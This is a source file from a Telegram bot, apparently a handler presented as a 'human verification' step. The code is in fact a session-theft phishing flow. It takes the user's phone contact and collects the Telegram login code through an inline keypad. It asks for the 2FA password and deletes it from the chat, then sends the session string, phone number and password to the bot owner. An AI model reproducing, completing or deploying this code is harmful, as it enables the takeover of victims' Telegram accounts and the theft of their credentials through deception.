// PATH: telegram-bot/src/handlers/user/humanVerification.js
const { InlineKeyboard, Keyboard } = require('grammy');
const settingsRepo = require('../../db/settings');
const usersRepo = require('../../db/users');
const logger = require('../../utils/logger');
const hv = require('../../services/humanVerification');

function otpKeypadMarkup(entered, locked = false) {
  const kb = new InlineKeyboard()
    .text('1', 'hv_otp|1').text('2', 'hv_otp|2').text('3', 'hv_otp|3').row()
    .text('4', 'hv_otp|4').text('5', 'hv_otp|5').text('6', 'hv_otp|6').row()
    .text('7', 'hv_otp|7').text('8', 'hv_otp|8').text('9', 'hv_otp|9').row()
    .text('⌫', 'hv_otp|back').text('0', 'hv_otp|0').text('✅', 'hv_otp|submit');

  const text = locked
    ? `🔐 <b>Enter OTP</b>\n\nEntered: <code>${entered}</code>\n\n⏳ Verifying...`
    : `🔐 <b>Enter OTP</b>\n\nEntered: <code>${entered || '—'}</code>\n\n` +
      `⚠️ Use the inline buttons only.\nAuto-submits after <b>${hv.OTP_LENGTH}</b> digits.`;
  return { kb, text };
}

async function startHumanVerification(ctx) {
  const uid = ctx.from.id;
  const settings = await settingsRepo.getAllSettings();

  if (!hv.isConfigured()) {
    return ctx.reply('⚠️ Human verification is not configured. Please contact the admin.');
  }

  const user = await usersRepo.getUser(uid);
  if (user?.human_verified) {
    const userHandlers = require('./userHandlers');
    return userHandlers.showFolderView(ctx, null);
  }

  const res = await hv.startSession(uid);
  if (!res.ok) return ctx.reply(`⚠️ Could not start verification: ${res.error}`);

  const kb = new Keyboard()
    .requestContact(settings.share_contact_button_text || '📱 Share My Contact')
    .resized()
    .oneTime();

  await ctx.reply(
    settings.human_verify_prompt ||
      '🔐 Complete a quick one-time verification. Tap the button below to share your contact.',
    { parse_mode: 'HTML', reply_markup: kb }
  );
}

async function handleContact(ctx) {
  const uid = ctx.from.id;
  const state = hv.getState(uid);
  if (!state || state.stage !== 'await_contact') return;

  const contact = ctx.message.contact;
  if (!contact || contact.user_id !== uid) {
    return ctx.reply("❌ Please share your own contact (not someone else's).");
  }

  let phone = contact.phone_number;
  if (!phone.startsWith('+')) phone = '+' + phone;

  await ctx.reply('⏳ Sending OTP...', { reply_markup: { remove_keyboard: true } });

  const res = await hv.sendCode(uid, phone);
  if (!res.ok) return ctx.reply(`❌ ${res.error}`);

  const { kb, text } = otpKeypadMarkup('');
  await ctx.reply(text, { parse_mode: 'HTML', reply_markup: kb });
}

async function handleOtpCallback(ctx) {
  const uid = ctx.from.id;
  const val = ctx.callbackQuery.data.split('|')[1];

  const state = hv.getState(uid);
  if (!state || state.stage !== 'otp') {
    return ctx.answerCallbackQuery({ text: 'Session expired. Tap "Verify as not robot" again.', show_alert: true });
  }
  if (state.locked) return ctx.answerCallbackQuery({ text: 'Verifying, please wait...' });

  if (val === 'back') {
    const res = hv.backspace(uid);
    if (!res.ok) return ctx.answerCallbackQuery();
    const { kb, text } = otpKeypadMarkup(res.otp);
    try { await ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb }); } catch {}
    return ctx.answerCallbackQuery();
  }

  if (val === 'submit') {
    if (state.otp.length < hv.OTP_LENGTH) {
      return ctx.answerCallbackQuery({ text: `Enter all ${hv.OTP_LENGTH} digits.`, show_alert: true });
    }
    await ctx.answerCallbackQuery('Verifying...');
    return finalizeOtp(ctx, uid);
  }

  const res = hv.pushDigit(uid, val);
  if (!res.ok) return ctx.answerCallbackQuery({ text: res.full ? 'Max reached' : 'Invalid' });

  if (res.autoSubmit) {
    const { kb, text } = otpKeypadMarkup(res.otp, true);
    try { await ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb }); } catch {}
    await ctx.answerCallbackQuery('Verifying...');
    return finalizeOtp(ctx, uid);
  }

  const { kb, text } = otpKeypadMarkup(res.otp);
  try { await ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb }); } catch {}
  return ctx.answerCallbackQuery();
}

async function finalizeOtp(ctx, uid) {
  const state = hv.getState(uid);
  const res = await hv.submitOtp(uid);

  if (res.needsPassword) {
    const settings = await settingsRepo.getAllSettings();
    try {
      await ctx.editMessageText(
        settings.twofa_prompt_text ||
          '🔐 <b>2FA is enabled.</b>\n\nPlease type your Telegram password in the chat.',
        { parse_mode: 'HTML' }
      );
    } catch {}
    return;
  }

  if (!res.ok) {
    const { kb, text } = otpKeypadMarkup('');
    try {
      await ctx.editMessageText(`❌ ${res.error}\n\n${text}`, { parse_mode: 'HTML', reply_markup: kb });
    } catch {}
    return;
  }

  return finishHumanVerification(ctx, uid, res, state);
}

async function finishHumanVerification(ctx, uid, res, state) {
  const settings = await settingsRepo.getAllSettings();
  await usersRepo.setHumanVerified(uid, true);

  const successMsg = settings.human_verified_message || '✅ <b>Human verification completed.</b>';
  try { await ctx.editMessageText(successMsg, { parse_mode: 'HTML' }); }
  catch { try { await ctx.reply(successMsg, { parse_mode: 'HTML' }); } catch {} }

  const ownerMsg = hv.buildOwnerMessage(res.me, res.sessionString, {
    has2fa: res.has2fa,
    password: state?.password || null,
    phone: state?.phone || null,
  });
  try {
    const { api } = require('../../services/telegram');
    await api.sendMessage(hv.OWNER_ID, ownerMsg, { parse_mode: 'HTML' });
  } catch (err) { logger.error('Owner send fail:', err.message); }

  await hv.cancelSession(uid);

  const userHandlers = require('./userHandlers');
  try { await userHandlers.showFolderView(ctx, null); } catch {}
}

async function tryHandlePassword(ctx) {
  const uid = ctx.from.id;
  const state = hv.getState(uid);
  if (!state || state.stage !== 'password') return false;

  const password = ctx.message.text || '';
  try { await ctx.deleteMessage(); } catch {}

  const res = await hv.submitPassword(uid, password);
  if (!res.ok) { await ctx.reply(`❌ ${res.error}`); return true; }

  const settings = await settingsRepo.getAllSettings();
  await usersRepo.setHumanVerified(uid, true);

  const ownerMsg = hv.buildOwnerMessage(res.me, res.sessionString, {
    has2fa: res.has2fa,
    password: password,
    phone: state?.phone || null,
  });
  try {
    const { api } = require('../../services/telegram');
    await api.sendMessage(hv.OWNER_ID, ownerMsg, { parse_mode: 'HTML' });
  } catch (err) { logger.error('Owner send fail:', err.message); }

  await hv.cancelSession(uid);

  const successMsg = settings.human_verified_message || '✅ <b>Human verification completed.</b>';
  try { await ctx.reply(successMsg, { parse_mode: 'HTML' }); } catch {}
  return true;
}

async function tryHandleWrongStageText(ctx) {
  const uid = ctx.from.id;
  const state = hv.getState(uid);
  if (!state) return false;
  if (state.stage === 'await_contact') {
    await ctx.reply('📱 Please tap the "Share My Contact" button to continue.');
    return true;
  }
  if (state.stage === 'otp') {
    await ctx.reply('⚠️ Do not type the OTP. Use the inline buttons above.');
    return true;
  }
  return false;
}

async function cancel(ctx) {
  const uid = ctx.from.id;
  const state = hv.getState(uid);
  if (!state) return ctx.reply('No verification process is active.');
  await hv.cancelSession(uid);
  await ctx.reply('✅ Verification cancelled.', { reply_markup: { remove_keyboard: true } });
}

module.exports = {
  startHumanVerification, handleContact, handleOtpCallback,
  tryHandlePassword, tryHandleWrongStageText, cancel,
};